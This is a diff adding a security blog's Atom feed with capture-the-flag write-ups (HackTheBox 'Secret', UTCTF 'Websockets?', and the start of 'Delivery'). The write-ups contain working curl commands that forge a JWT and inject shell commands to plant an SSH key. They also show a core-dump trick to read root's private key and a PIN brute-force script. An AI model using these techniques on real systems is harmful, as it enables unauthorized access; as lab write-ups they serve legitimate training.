@@ -1,0 +1,813 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://blog.daanbreur.systems/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.daanbreur.systems/" rel="alternate" type="text/html" /><updated>2022-03-27T18:37:54+00:00</updated><id>https://blog.daanbreur.systems/feed.xml</id><title type="html">daanbreur</title><subtitle>Hey, I am Daan. A programmer and hacker.</subtitle><author><name>daanbreur</name></author><entry><title type="html">[Writeup] HackTheBox | Secret</title><link href="https://blog.daanbreur.systems/2022/03/26/htb-Secret.html" rel="alternate" type="text/html" title="[Writeup] HackTheBox | Secret" /><published>2022-03-26T00:00:00+00:00</published><updated>2022-03-26T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2022/03/26/htb-Secret</id><content type="html" xml:base="https://blog.daanbreur.systems/2022/03/26/htb-Secret.html"><![CDATA[<p><img src="/assets/CTFs/HTB/Secret/infopanel.png" alt="" class="modal" /></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+
+<p>Lets start with enumerating the machine using nmap to find open ports and information about the services running on those.
+I used the following command todo so.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/detailed 10.10.11.120
+</code></pre></div></div>
+
+<p>The options I used are: <code class="language-plaintext highlighter-rouge">-sC</code> to run TCP connection scan, <code class="language-plaintext highlighter-rouge">-sV</code> to run a service scan, <code class="language-plaintext highlighter-rouge">-oN</code> to save to file.</p>
+
+<pre><code class="language-log">Nmap scan report for 10.10.11.120
+Host is up (0.031s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
+|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
+|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: DUMB Docs
+3000/tcp open  http    Node.js (Express middleware)
+|_http-title: DUMB Docs
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb 21 20:48:47 2022 -- 1 IP address (1 host up) scanned in 13.33 seconds
+</code></pre>
+
+<p>Port 80 has a nginx server and Port 3000 has a NodeJS express server.
+The nginx server may just be a reverseproxy. Going to port 80 and 3000 in a browser we get the same site, this means nginx is probably only running as a reverse proxy. We find a download link on the website with the api sourcecode, lets enumerate and search for vulnerabilities.</p>
+
+<h3 id="enumeration---source-code">Enumeration - Source Code</h3>
+
+<p>First thing I did is list all files in the directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span>
+total 119
+drwxrwxrwx 1 root root  4096 sep  3  2021 <span class="nb">.</span>
+drwxrwxrwx 1 root root     0 feb 21 21:06 ..
+<span class="nt">-rwxrwxrwx</span> 1 root root    72 sep  3  2021 .env
+drwxrwxrwx 1 root root  4096 sep  8  2021 .git
+<span class="nt">-rwxrwxrwx</span> 1 root root   885 sep  3  2021 index.js
+drwxrwxrwx 1 root root     0 aug 13  2021 model
+drwxrwxrwx 1 root root 40960 aug 13  2021 node_modules
+<span class="nt">-rwxrwxrwx</span> 1 root root   491 aug 13  2021 package.json
+<span class="nt">-rwxrwxrwx</span> 1 root root 69452 aug 13  2021 package-lock.json
+drwxrwxrwx 1 root root     0 sep  3  2021 public
+drwxrwxrwx 1 root root     0 feb 21 22:12 routes
+drwxrwxrwx 1 root root     0 aug 13  2021 src
+<span class="nt">-rwxrwxrwx</span> 1 root root   651 aug 13  2021 validations.js
+</code></pre></div></div>
+
+<p>And we notice a few things, this is indeed a NodeJS application. It also contains <code class="language-plaintext highlighter-rouge">.git</code> folder and there is a <code class="language-plaintext highlighter-rouge">.env</code> file.
+A <code class="language-plaintext highlighter-rouge">.git</code> folder is what git uses for repo’s its essentially where all the commits and changes are stored. A <code class="language-plaintext highlighter-rouge">.env</code> file is a file where you can place your environment variables, so you can exclude the file before uploading the rest of your source.</p>
+
+<p>Lets also take a look at the endpoints. One of the files looks interesting <code class="language-plaintext highlighter-rouge">/routes/private.js</code> which contains a entry for <code class="language-plaintext highlighter-rouge">/api/logs</code>.
+It takes a query parameter <code class="language-plaintext highlighter-rouge">?file</code> and run <code class="language-plaintext highlighter-rouge">git log --oneline</code> with the parameter <code class="language-plaintext highlighter-rouge">file</code> appended to it, this can lead us to RCE!
+But only the admin (<code class="language-plaintext highlighter-rouge">username: "theadmin"</code>) can use it.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logs</span><span class="dl">'</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">userinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="p">}</span>
+    <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">theadmin</span><span class="dl">'</span><span class="p">){</span>
+        <span class="kd">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="s2">`git log --oneline </span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+        <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+                <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                <span class="k">return</span>
+            <span class="p">}</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
+        <span class="p">})</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+            <span class="na">role</span><span class="p">:</span> <span class="p">{</span>
+                <span class="na">role</span><span class="p">:</span> <span class="dl">"</span><span class="s2">you are normal user</span><span class="dl">"</span><span class="p">,</span>
+                <span class="na">desc</span><span class="p">:</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span>
+            <span class="p">}</span>
+        <span class="p">})</span>
+    <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>Another file I notice is <code class="language-plaintext highlighter-rouge">/routes/verifytoken.js</code> . This is the code that checks our <code class="language-plaintext highlighter-rouge">auth-token</code> it looks like this is using JWT. 
+The verify function doesn’t check the algorithm used on the JWT-token. It only specifies the secret to use, this is stored in environment variable <code class="language-plaintext highlighter-rouge">TOKEN_SECRET</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">auth-token</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access Denied</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">verified</span><span class="p">;</span>
+        <span class="nx">next</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Remember that we found that <code class="language-plaintext highlighter-rouge">.env</code> file? Maybe this contains our <code class="language-plaintext highlighter-rouge">TOKEN_SECRET</code> variable and we can use it to craft our JWT-token.
+Logging the file we see it doesn’t contain much information and that the <code class="language-plaintext highlighter-rouge">TOKEN_SECRET</code> is <code class="language-plaintext highlighter-rouge">secret</code>. Its likely removed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DB_CONNECT <span class="o">=</span> <span class="s1">'mongodb://127.0.0.1:27017/auth-web'</span>
+TOKEN_SECRET <span class="o">=</span> secret
+</code></pre></div></div>
+
+<p>If it was ever in there it should be in a git commit, because the folder is a repository. Lets check the logs.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log
+</code></pre></div></div>
+
+<p>It contains a commit <em>“removed .env for security reasons”</em>, lets use <code class="language-plaintext highlighter-rouge">git diff</code> to check what changed. The commithash associated is <code class="language-plaintext highlighter-rouge">67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</code>.
+To view changes in a specific commit you can use the following command <code class="language-plaintext highlighter-rouge">git diff COMMIT^!</code>. The <code class="language-plaintext highlighter-rouge">COMMIT</code> parameter is a <a href="https://git-scm.com/docs/gitglossary#def_commit-ish">commit-ish</a>.</p>
+
+<blockquote>
+  <p>A <a href="https://git-scm.com/docs/gitglossary#def_commit_object">commit object</a> or an <a href="https://git-scm.com/docs/gitglossary#def_object">object</a> that can be recursively dereferenced to a commit object. The following are all commit-ishes: a commit object, a <a href="https://git-scm.com/docs/gitglossary#def_tag_object">tag object</a> that points to a commit object, a tag object that points to a tag object that points to a commit object, etc.</p>
+</blockquote>
+
+<p>This basically means the hash that we just found.
+Replacing this with the correct value and this will be the command we need to run.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git diff de0a46b5107a2f4d26e348303e76d85ae4870934..
+</code></pre></div></div>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/.env b/.env
+index fb6f587..31db370 100644
+</span><span class="gd">--- a/.env
+</span><span class="gi">+++ b/.env
+</span><span class="p">@@ -1,2 +1,2 @@</span>
+ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+<span class="gd">-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</span><span class="gi">+TOKEN_SECRET = secret
+</span></code></pre></div></div>
+
+<p>And we see a secret! Now we can use this so sign the JWT-token. The contents of the token will be <code class="language-plaintext highlighter-rouge">{"name":"theadmin"}</code>.
+I used an online tool to generate the JWT-token and this is my result <em>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s</em></p>
+
+<p><img src="/assets/CTFs/HTB/Secret/jwt-generate.png" alt="" class="modal" /></p>
+
+<p>Now if we set the <code class="language-plaintext highlighter-rouge">auth-token</code> header to our generated JWT-token and go to <code class="language-plaintext highlighter-rouge">/api/priv</code> it shows us that we are the  <code class="language-plaintext highlighter-rouge">"theadmin"</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-H</span> <span class="s1">'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s'</span> <span class="s1">'http://10.10.11.120/api/priv'</span>
+</code></pre></div></div>
+
+<h2 id="gaining-user">Gaining user</h2>
+
+<p>Now that we are the required user we can start exploiting the API. Adding any command to the end of the <code class="language-plaintext highlighter-rouge">?file</code> parameter will run it. Lets try it with <code class="language-plaintext highlighter-rouge">id</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-H</span> <span class="s1">'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s'</span> <span class="s1">'http://10.10.11.120/api/logs?file=.env;id'</span>
+</code></pre></div></div>
+
+<p>We get command output. <code class="language-plaintext highlighter-rouge">"ab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"</code>.
+Now we can try getting a reverseshell. After playing around a bit to get one working I ended up generating and uploading a sshkey.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096 <span class="nt">-C</span> <span class="s1">'get@hacked'</span> <span class="nt">-f</span> dasith <span class="nt">-P</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<p>From the output from <code class="language-plaintext highlighter-rouge">id</code> we know that the username is <code class="language-plaintext highlighter-rouge">dasith</code>. Our attackplan is as follows.</p>
+<ol>
+  <li>Make the <code class="language-plaintext highlighter-rouge">.ssh</code> folder in the home directory if it doesn’t exist. <em>(<code class="language-plaintext highlighter-rouge">mkdir -p /home/dasith/.ssh</code>)</em></li>
+  <li>Write our public key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> <em>(<code class="language-plaintext highlighter-rouge">echo $PUBLIC_KEY &gt;&gt; /home/dasith/.ssh/authorized_keys</code>)</em></li>
+</ol>
+
+<p>First lets store our public key contents into a bash variable <code class="language-plaintext highlighter-rouge">$PUBLIC_KEY</code>. This will be easier then copying it into the request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PUBLIC_KEY</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>dasith.pub<span class="si">)</span>
+</code></pre></div></div>
+
+<p>Then running the curl command that “uploads” our public key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-H</span> <span class="s1">'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s'</span> <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"file=.env;mkdir -p /home/dasith/.ssh; echo </span><span class="nv">$PUBLIC_KEY</span><span class="s2"> &gt;&gt; /home/dasith/.ssh/authorized_keys"</span> http://10.10.11.120/api/logs
+</code></pre></div></div>
+<p>This will be our final command.
+What does it do?</p>
+
+<ul>
+  <li>Print Headers</li>
+  <li>Use GET</li>
+  <li>Send the parameters inside of the query</li>
+  <li>Send this command <code class="language-plaintext highlighter-rouge">mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY &gt;&gt; /home/dasith/.ssh/authorized_keys</code> where <code class="language-plaintext highlighter-rouge">$PUBLIC_KEY</code> is replaced with the contents that we already saved to it.</li>
+</ul>
+
+<p>Now we can use our sshkey to login.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> dasith dasith@10.10.11.120
+</code></pre></div></div>
+
+<p>Now that we are in, we can get the flag!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user.txt 
+&lt;REDACTED&gt;
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Inside of the <code class="language-plaintext highlighter-rouge">/opt</code> folder we find a SUID binary <strong><code class="language-plaintext highlighter-rouge">count</code></strong> and its source code.
+Looking through the sourcecode I find something interesting.
+It contains the following code</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This means that when the program crashes it generates a dump file.
+We can make the program crash on purpose to leak information that’s stored in memory.
+Like the file contents!</p>
+
+<h2 id="gaining-root">Gaining root</h2>
+
+<p>Now we can read any file as root. What next? Well root might have a idrsa file that we can then use to login over ssh.
+Our attack steps are as follows.</p>
+
+<ol>
+  <li>Run the binary.</li>
+  <li>Supply the filename to read (<code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>).</li>
+  <li>Background the process (<kbd>Ctrl</kbd> + Z).</li>
+  <li>Get process id using <code class="language-plaintext highlighter-rouge">ps</code>.</li>
+  <li>Kill the process, with the flag <code class="language-plaintext highlighter-rouge">SIGSEGV</code>.</li>
+  <li>Foreground process with <code class="language-plaintext highlighter-rouge">fg</code>.</li>
+</ol>
+
+<p>Lets do it and see if it works.</p>
+
+<p><img src="/assets/CTFs/HTB/Secret/coredump-count.png" alt="" class="modal" /></p>
+
+<p>We succesfully dumped the core. Now we need to retrieve the data inside of the dump.
+Start by checking what utility is used to “pack” the data. This is commonly stored in <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/core_pattern</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|/usr/share/apport/apport %p %s %c %d %P %E
+</code></pre></div></div>
+
+<p>In this case, a crash will be handled by the <a href="https://wiki.ubuntu.com/Apport">Apport</a> utility.
+We can unpack the file using <code class="language-plaintext highlighter-rouge">apport-unpack</code>, apport by default saves its crashes in <code class="language-plaintext highlighter-rouge">/var/crash</code>. 
+With the following command we unpack it to <code class="language-plaintext highlighter-rouge">/tmp/crashdata</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashdata
+</code></pre></div></div>
+
+<p>Now that we unpacked the crash we can look at the <code class="language-plaintext highlighter-rouge">CoreDump</code> file located inside of the folder we extracted to.
+Lets run strings against it to look for any strings.</p>
+
+<p><img src="/assets/CTFs/HTB/Secret/coredump-strings.png" alt="" class="modal" /></p>
+
+<p><img src="/assets/CTFs/HTB/Secret/dump-idrsa.png" alt="" class="modal" /></p>
+
+<p>And somewhere in there we found our <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> file.
+Lets save it to a file <code class="language-plaintext highlighter-rouge">secret.root</code> and then login with it using ssh.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 secret.root
+ssh <span class="nt">-i</span> secret.root root@10.10.11.120
+</code></pre></div></div>
+
+<p>We got a shell and are logged in as root!
+Now we can get the flag and submit it.</p>
+
+<p><img src="/assets/CTFs/HTB/Secret/root-flag.png" alt="" class="modal" /></p>
+
+<p>Of course you would have been able to just get the flag from the coredump method but then you didn’t really root the box, only got a way to read files.</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://jwt.io/">JWT.io</a></li>
+  <li><a href="https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/">Understanding core dumps Linux</a></li>
+  <li><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl(2) - Linux manual page</a></li>
+  <li><a href="https://wiki.ubuntu.com/Apport">Apport - Ubuntu Wiki</a></li>
+</ul>]]></content><author><name>daanbreur</name></author><category term="hackthebox" /><category term="linux" /><category term="nodejs" /><category term="jwt" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[Writeup] UTCTF 2022 | Websockets?</title><link href="https://blog.daanbreur.systems/2022/03/15/UTCTF2022-Websockets.html" rel="alternate" type="text/html" title="[Writeup] UTCTF 2022 | Websockets?" /><published>2022-03-15T00:00:00+00:00</published><updated>2022-03-15T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2022/03/15/UTCTF2022-Websockets</id><content type="html" xml:base="https://blog.daanbreur.systems/2022/03/15/UTCTF2022-Websockets.html"><![CDATA[<p><img src="/assets/CTFs/UTCTF2022/Websockets/challenge_info.png" alt="" class="modal" /></p>
+
+<p><strong>Websockets?</strong> was a challenge in the web category for UTCTF 2022, in the end it has 173 Solves and it was worth 335 Points. It was relatively easy.</p>
+
+<p>We find this website without much information or input, checking its source we find a new page <code class="language-plaintext highlighter-rouge">/internal/login</code> and a username <code class="language-plaintext highlighter-rouge">admin</code>.
+Going to this we now see a login, it requires a username and password. Lets open its source and see what we can find. There is a comment it says the following</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack --&gt;</span>
+</code></pre></div></div>
+
+<p>So the password will be 3 diget’s long? So it will have a range from <code class="language-plaintext highlighter-rouge">000</code> to <code class="language-plaintext highlighter-rouge">999</code>.</p>
+
+<p>There also is a JavaScript file, opening it shows us something interesting. The login uses websockets to verify the password, we can easily bruteforce it.
+Lets write a small script using python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">asyncio</span>
+<span class="kn">import</span> <span class="nn">websockets</span>
+<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">'ws://web1.utctf.live:8651/internal/ws'</span>
+<span class="n">PINLENGTH</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">USERNAME</span> <span class="o">=</span> <span class="s">'admin'</span>
+
+<span class="k">async</span> <span class="k">def</span> <span class="nf">tryLoginWith</span><span class="p">(</span><span class="n">pin</span><span class="p">):</span>
+    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
+        <span class="n">begin</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websocket</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">begin</span> <span class="o">==</span> <span class="s">'begin'</span><span class="p">:</span>
+            <span class="k">await</span> <span class="n">websocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'begin'</span><span class="p">)</span>
+            <span class="k">await</span> <span class="n">websocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'user </span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">await</span> <span class="n">websocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'pass </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+            <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websocket</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+            <span class="k">if</span> <span class="s">'session'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[&lt;&lt;&lt;] Data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s"> | Pincode: </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[-] Wrong Pincode: </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">asyncio</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">tryLoginWith</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">args</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="n">PINLENGTH</span><span class="p">)))</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="p">[</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span> <span class="p">]</span>
+<span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">100</span><span class="p">)</span> <span class="k">as</span> <span class="n">pool</span><span class="p">:</span>
+    <span class="n">pool</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">send</span><span class="p">,</span><span class="n">args</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>^ A download for this script can be found <a href="/assets/CTFs/UTCTF2022/Websockets/solve.py">here</a></p>
+
+<p>This code uses multithreading to get the correct pincode as quickly as possible. It also makes sure that the pincode is padded with zero’s in front. Running this results in the following output.</p>
+
+<p><img src="/assets/CTFs/UTCTF2022/Websockets/pincode_done.png" alt="" class="modal" /></p>
+
+<p>The pincode it found is <code class="language-plaintext highlighter-rouge">907</code>.
+Lets login with this acquired pincode, and we got the flag! <strong>utflag{w3bsock3ts}</strong></p>]]></content><author><name>daanbreur</name></author><category term="websocket" /><category term="authentication" /><category term="bruteforcing" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[Writeup] HackTheBox | Delivery</title><link href="https://blog.daanbreur.systems/2021/05/28/htb-Delivery.html" rel="alternate" type="text/html" title="[Writeup] HackTheBox | Delivery" /><published>2021-05-28T00:00:00+00:00</published><updated>2021-05-28T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2021/05/28/htb-Delivery</id><content type="html" xml:base="https://blog.daanbreur.systems/2021/05/28/htb-Delivery.html"><![CDATA[<p><img src="/assets/CTFs/HTB/Delivery/infopanel.png" alt="" /></p>
+
+<h2 id="ports">Ports</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+8065/tcp open  unknown
+</code></pre></div></div>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>On port 8065 there is a Mattermost Server, its a sort of slack but selfhosted.</p>
+
+<blockquote>
+  <p>Mattermost is an open-source, self-hostable online chat service with file sharing, search, and integrations. It is designed as an internal chat for organisations and companies, and mostly markets itself as an open-source alternative to Slack and Microsoft Teams.</p>
+
+  <p>https://en.wikipedia.org/wiki/Mattermost</p>
+</blockquote>
+
+<p>In the next image, we can see that an email is needed for mattermost.
+<img src="/assets/CTFs/HTB/Delivery/mattermost-setup.png" alt="" /></p>
+
+<p>We cant use our own email but we need an <code class="language-plaintext highlighter-rouge">@delivery.htb</code>mail address.
+How can we get an <code class="language-plaintext highlighter-rouge">@delivery.htb</code>mail address, lets check out what’s on port 80 maybe we find something useful there.</p>
+
+<p>On port 80 there is a a vhost for <code class="language-plaintext highlighter-rouge">helpdesk.delivery.htb</code> which has helpdesk software based on <a href="https://osticket.com/">OSTicket</a>.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/helpdesk-main.png" alt="" /></p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/helpdesk-create.png" alt="" /></p>
+
+<p>When we try to make a ticket we can see it asks for some information, lets enter a random email address in there and check if it accepts it. Make sure to remember what you entered.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/helpdesk-ticketcreated.png" alt="" /></p>
+
